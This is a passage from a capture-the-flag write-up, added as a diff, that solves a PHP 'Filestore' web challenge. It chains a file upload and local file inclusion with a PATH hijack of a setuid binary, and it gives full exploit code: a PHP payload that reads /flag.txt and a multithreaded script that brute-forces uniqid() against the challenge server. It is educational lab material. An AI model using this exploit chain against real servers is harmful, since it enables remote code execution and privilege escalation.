@@ -750,3 +750,155 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+# Web
+
+## Filestore
+
+We are given the source code for a simple PHP application, as well as a Dockerfile and a couple of ELFs.
+
+The PHP source is the following:
+
+```php
+<?php
+    if($_SERVER['REQUEST_METHOD'] == "POST"){
+        if ($_FILES["f"]["size"] > 1000) {
+            echo "file too large";
+            return;
+        }
+
+        $i = uniqid();
+
+        if (empty($_FILES["f"])){
+            return;
+        }
+
+        $where = "./uploads/" . $i . "_" . hash('sha256', $_FILES["f"]["name"]) . "_" . $_FILES["f"]["name"];
+        print($where);
+        if (move_uploaded_file($_FILES["f"]["tmp_name"], $where)){
+            echo "upload success";
+        } else {
+            echo "upload error";
+        }
+    } else {
+        if (isset($_GET["f"])) {
+            include "./uploads/" . $_GET["f"];
+        }
+
+        highlight_file("index.php");
+
+        // this doesn't work, so I'm commenting it out 😛
+        // system("/list_uploads");
+    }
+?>
+```
+
+By looking at it, we can see that we can:
+
+- include a file from the `upload` directory
+- upload a file to the `upload` directory
+
+However, the name of the file is not fully predictable: it is composed of a `uniqid()`, of its hash, and of the filename we passed. The last two are predictable, but the first one will need to some work. From the [PHP manual](https://www.php.net/manual/en/function.uniqid.php) and from running `uniqid()` locally, we can see that we can probably just bruteforce a little to succeed in including our file.
+
+Before this, however, we need to find a way to get the flag. From the Dockerfile, we get to know that the flag is in `/flag.txt`. The issue is that the flag file is owned by the `admin` user and readable only by him (and its group), whereas the PHP app is running as the `ctf` user, meaning that we need to escalate privileges.
+
+Remember that there are two binaries in the filesystem of the challenge?
+Well, from the Dockerfile we can see that they have the SETUID bit set, and they are owned by `admin`, meaning that we may be able to use them to escalate our privileges.
+
+### Finding a privilege escalation...
+
+We proceeded by opening these two ELFs in Ghidra. They are both pretty simple. The `make_abyss_entry` binary is just used to create a temporary directory in the `/abyss` directory, which we cannot list. This is probably here to allow us to create files on the filesystem without leaking them to other CTF players.
+Then, we analyzed the `list_uploads` binary too. The decompiled main looks like the following:
+
+```c
+void main(void) {
+  __gid_t __rgid;
+
+  setbuf(stdout, NULL);
+  setbuf(stdin, NULL);
+  __rgid = getegid();
+  setresgid(__rgid, __rgid, __rgid);
+  system("ls /var/www/html/uploads");
+  return;
+}
+```
+
+Do you see the vulnerability in here? The issue is not that it is using `system` (well, that's part of it actually...). The problem here arises from the fact that it is using `system` and calling `ls` without specifying the full path or clearing the `PATH` env variable. Therefore, we can hijack its call to `ls` by defining a script named `ls` and setting `PATH=/dir/of/our/ls:$PATH`, leading to our `ls` script being executed with `admin` privileges.
+
+### ... and exploiting it!
+
+We know have all the pieces to exploit the vulnerability, right? Right?
+Almost: notice line 39 on the Dockerfile:
+
+```
+RUN rm -f /bin/chmod /usr/bin/chmod /bin/chown /usr/bin/chown
+```
+
+We do not have the `chmod` command! As our goal is to create a script that is executed in place of `/bin/ls`, we need it to be executable! Hope's not lost though: `chmod` is not the only way to change file permissions. In fact, it is just an interface to the system call `chmod`! We just need to find another way to call it. The first approach was to use PHP. We can already execute a PHP script as it is included, might as well use to `chmod` our `ls`. Unfortunately, it does not appear to work. I couldn't find a reason why. Anyhow, we can also use PERL, which is installed on the challenge container: `perl -e 'chmod 0777, "/path/to/ls"'`.
+
+Finally, we can put together a PHP script that will leak us the flag:
+
+```php
+<?php
+$abyss = trim(shell_exec("/make_abyss_entry"));
+$ls = "/abyss/" . $abyss . "/ls";
+system("echo -e '#!/bin/sh\\\\ncat /flag.txt' > " . $ls);
+system("perl -e 'chmod 0777, \\"$ls\\"'");
+system("export PATH=/abyss/$abyss:\\$PATH && /list_uploads");
+```
+
+The first line creates a directory in `/abyss` to put our `ls` in. Then, we first create the `ls` file with a simple `cat /flag.txt` command in it, we `chmod` it using PERL, and finally we run the `/list_uploads` ELF with the PATH set to use our `ls`.
+
+### Sending the exploit
+
+Last issue: we have to send our exploit and have it executed. To do this, we need to somehow guess the `uniqid()` output. The first thing that we can notice is that the server includes the `Date` header. From MSN documentation: "The Date general HTTP header contains the date and time at which the message originated. "
+From this, we get to know the second in which the `uniqid()` was (likely) called. This de-randomizes the first 8 nibbles of `uniqid()`. The last 5 nibbles are still random, but we can try to brute force them. They are quite a bit, but with a bit (double pun intended) of luck we manage to succeed.
+
+The script used is the following:
+
+```py
+#!/usr/bin/env python
+import concurrent
+import concurrent.futures
+import requests
+import datetime
+
+file_content = """
+<?php
+$abyss = trim(shell_exec("/make_abyss_entry"));
+$ls = "/abyss/" . $abyss . "/ls";
+system("echo -e '#!/bin/sh\\\\ncat /flag.txt' > " . $ls);
+system("perl -e 'chmod 0777, \\"$ls\\"'");
+system("export PATH=/abyss/$abyss:\\$PATH && /list_uploads");
+"""
+filename = "exploit.php"
+file_hash = "ab1159fd69632fa2c058c7a5a4a25e17696dfb32442a67cdb8643aabdff6955e"
+
+open(filename, "w").write(file_content)
+
+base_url = "https://filestore.web.actf.co"
+
+f = open(filename)
+r = requests.post(base_url, files={"f": f})
+print(r.text)
+
+date = r.headers["Date"]
+date = datetime.datetime.strptime(date, "%a, %d %b %Y %H:%M:%S %Z")
+date = int(date.timestamp()) + 3600 * 2
+
+guesses = ["%08x" % date + "%05x" % i for i in range(0, 0xFFFFF)]
+
+
+def get_flag(guess):
+    print(".")
+    r = requests.get(base_url, params={"f": f"{guess}_{file_hash}_{filename}"})
+    if "actf{" in r.text:
+        print(r.text)
+        exit(0)
+
+
+with concurrent.futures.ThreadPoolExecutor(max_workers=1000) as executor:
+    executor.map(get_flag, guesses)
+```
+
+P.S. when solving the challenge, this script worked at the first execution. Now it doesn't seem to find the flag. We may have got lucky with a very low `uniqid()` value for the microseconds. There may also be a smarter solution as well, but an online bruteforce of $~10^6$ looks feasible enough to me 🙃.
